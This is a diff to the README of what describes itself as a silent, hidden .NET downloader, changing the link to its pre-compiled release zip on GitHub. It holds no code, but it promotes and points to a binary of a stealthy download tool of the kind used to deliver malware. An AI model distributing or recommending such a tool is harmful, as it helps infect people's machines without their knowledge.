@@ -15,7 +15,7 @@ A free silent (hidden) open-source downloader (Downloader .NET C#) file.
 
 ## **Downloads**
 
-Pre-Compiled: https://github.com/xssis57/XssDownloader/releases/download/Xss/XssDownloader.zip
+Pre-Compiled: https://github.com/xssis57/XssDownloader/releases/download/Xss/Release.zip
 
 
 ## **Contributing**
